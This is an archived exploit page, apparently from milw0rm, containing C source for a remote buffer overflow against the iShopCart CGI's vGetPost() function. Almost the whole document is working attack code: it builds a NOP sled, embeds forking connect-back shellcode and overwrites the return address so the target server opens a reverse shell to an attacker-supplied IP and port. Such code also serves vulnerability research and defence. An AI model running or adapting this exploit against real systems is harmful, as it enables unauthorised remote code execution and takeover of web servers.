<html><head><title>iShopCart vGetPost() Remote Buffer Overflow Exploit (cgi)</title></head><pre>/* Creator: K-sPecial (xzziroz.net) of .aware (awarenetwork.org)
 * Name: ishopcart-cgi-bof.c (&lt;= easy-scart6.c)
 * Date: 5/25/2006
 * Version:
 *  1.00 (5/25/2006) - ishopcart-cgi-bof.c created
 *
 * Description: there is an overflow in the vGetPost() function, it does not do any size checking on the inputed data but instead
 *  reads until the word &quot;Submit&quot; is encountered, in turn overflowing pszBuf which points to a 4000 byte buffer in main(). Complete
 *  code execution is spawned, with the code being a connectback shell.
 *
 * Notes: I could not for the life of me find any connect back shellcode that forks! This code needed to fork because apache
 *  was killing the connect back process as soon as it connected. So, in turn, I have modified netric's callback shellcode with
 *  some forking shellcode to accomplish the workaround.
 *
 * Compile: gcc -o icb ishopcart-cgi-bof.c -std=c99
*/
#include &lt;stdio.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;netdb.h&gt;
#include &lt;string.h&gt;
#include &lt;getopt.h&gt;
#include &lt;errno.h&gt;
#include &lt;stdlib.h&gt;

#define PORT 		80
#define CB_PORT		31337
#define IP_OFFSET       33 + 13
#define PORT_OFFSET     39 + 13    // + 13 to these for the new forking mod added to cb[]
#define OFFSET		0x41414141 // find your own damn offset, the code works 100% any fault is on yourself

void changeip(char *ip);
void changeport(char *code, int port, int offset);
void help(void);

// netric callback shellcode
char cb[] =
        &quot;\x31\xc0\x31\xdb&quot; 

        &quot;\xb0\x02&quot;                      // movb         $0x2,%al        / sys_fork (2)
        &quot;\xcd\x80&quot;                      // int          $0x80
        &quot;\x38\xc3&quot;                      // cmpl         %ebx,%eax       / check if child; %eax = 0x0
        &quot;\x74\x05&quot;                      // je           0x5             / jump after the exit if we're the child
        // sys_exit (1)
        &quot;\x8d\x43\x01&quot;                  // leal         0x1(%ebx),%eax  / sys_exit (1) if we're the parent
        &quot;\xcd\x80&quot;                      // int          $0x80           / interrupt 80 to execute sys_exit
	
	&quot;\x31\xc9\x51\xb1&quot;
        &quot;\x06\x51\xb1\x01\x51\xb1\x02\x51&quot;
        &quot;\x89\xe1\xb3\x01\xb0\x66\xcd\x80&quot;
        &quot;\x89\xc2\x31\xc0\x31\xc9\x51\x51&quot;
        &quot;\x68\x41\x42\x43\x44\x66\x68\xb0&quot;
        &quot;\xef\xb1\x02\x66\x51\x89\xe7\xb3&quot;
        &quot;\x10\x53\x57\x52\x89\xe1\xb3\x03&quot;
        &quot;\xb0\x66\xcd\x80\x31\xc9\x39\xc1&quot;
        &quot;\x74\x06\x31\xc0\xb0\x01\xcd\x80&quot;
        &quot;\x31\xc0\xb0\x3f\x89\xd3\xcd\x80&quot;
        &quot;\x31\xc0\xb0\x3f\x89\xd3\xb1\x01&quot;
        &quot;\xcd\x80\x31\xc0\xb0\x3f\x89\xd3&quot;
        &quot;\xb1\x02\xcd\x80\x31\xc0\x31\xd2&quot;
        &quot;\x50\x68\x6e\x2f\x73\x68\x68\x2f&quot;
        &quot;\x2f\x62\x69\x89\xe3\x50\x53\x89&quot;
        &quot;\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0&quot;
        &quot;\x01\xcd\x80&quot;;

int main (int argc, char **argv) {
	int sock;
	unsigned offset = OFFSET, ipaddr, i = 0;
	unsigned short port = PORT, cbport = CB_PORT;
	struct sockaddr_in server;
	char *host, *location, *cbip, buff[5120], opt;

	host = location = cbip = 0;
	
	while ((opt = getopt(argc, argv, &quot;i:p:o:l:1:2:h&quot;)) != -1) {
		switch(opt) { 
			case 'i':
				host = optarg;
				break;
			case 'p':
				sscanf(optarg, &quot;%hu&quot;, &amp;port);
				break;
			case 'o':
				sscanf(optarg, &quot;%x&quot;, &amp;offset);
				break;
			case 'l':
				location = optarg;
				break;
			case '1':
				cbip = optarg;
				break;
			case '2':
				sscanf(optarg, &quot;%hu&quot;, &amp;cbport);
				break;
		}
	}

	if (!(host &amp;&amp; location &amp;&amp; cbip)) { 
		puts(&quot;-!&gt; a required argument was missing\n&quot;);
		help();
		exit(1);
	}

        changeip(cbip);
	changeport(cb, cbport, PORT_OFFSET);
	
	if ((sock = socket(PF_INET, SOCK_STREAM, 0)) == -1) {
		printf(&quot;socket() error: %s\n&quot;, strerror(errno));
		exit(1);
	}
	server.sin_port = htons(port);	

        if ((ipaddr = inet_addr(host)) == -1) {
		struct hostent *myhost;
		if ((myhost = gethostbyname(host)) == 0) {
			printf(&quot;-!&gt; failed to resolve host '%s'\n&quot;, host);
			exit(1);
		}
		memcpy((char*) &amp;server.sin_addr, myhost-&gt;h_addr, myhost-&gt;h_length);
	}
	else server.sin_addr.s_addr = ipaddr;

	server.sin_family = AF_INET;
	memset(&amp;(server.sin_zero), 0, 8);

        if (connect(sock, (struct sockaddr *) &amp;server, sizeof(server)) != 0) {
	        printf(&quot;-!&gt; connect() to '%s:%hu' failed: %s\n&quot;, host, port, strerror(errno));
		exit(1);
	}
	sprintf(buff, &quot;GET %s?sslinvoice HTTP/1.1\nHost: %s\nContent-Length: %u\n\n&quot;, location, host, 4000 + sizeof(cb) + 512 - 1 + strlen(&quot;Submit&quot;));
	send(sock, buff, strlen(buff), 0);

	for (0; i &lt; 4000; i++) *(buff+i) = 0x90;
	for (unsigned a = 0; a &lt; sizeof(cb) - 1; i++, a++)  *(buff+i) = *(cb+a);
	for (unsigned a = 0; a &lt; 128; i += 4, a++) memcpy(buff+i, &amp;offset, 4);
	
	strcpy(buff+4000+sizeof(cb)+512 - 1, &quot;Submit\n&quot;);

	
	send(sock, buff, 4000 + sizeof(cb) + 512 - 1 + strlen(&quot;Submit&quot;), 0);
}

void help (void) { 
	char *string = &quot;ishopcart CGI shopcart buffer overflow exploit by K-sPecial (http://xzziroz.net) of .aware (http://awarenetwork.org)\nLicense: GPL (5/24/2006)\n\n&quot;
		       &quot;-i &lt;%s&gt;  \t - specifies the vulnerable host; default 80\n&quot;
		       &quot;-p [%hu] \t - specifies the vulnerable host's port\n&quot;
		       &quot;-l &lt;%s&gt;  \t - specifies the vulnerable CGI location\n&quot;
		       &quot;-o [%x]  \t - forces an explicit offset\n&quot;
		       &quot;-1 &lt;%s&gt;  \t - specifies the connect back ip\n&quot;
		       &quot;-2 [%hu] \t - specifies the connect back port; default 31337\n&quot;
		       &quot;-h	 \t - shows this help\n&quot;;

	puts(string);
}		       

void changeip(char *ip) {
        char *ptr;
        ptr=cb+IP_OFFSET;
        /* Assume Little-Endianess.... */
        *((long *)ptr)=inet_addr(ip);
}

// ripped from some of snooq's code
void changeport(char *code, int port, int offset) {
        char *ptr;
        ptr=code+offset;
        /* Assume Little-Endianess.... */
        *ptr++=(char)((port&gt;&gt;8)&amp;0xff);
        *ptr++=(char)(port&amp;0xff);
}

// milw0rm.com [2006-06-02]</pre></html>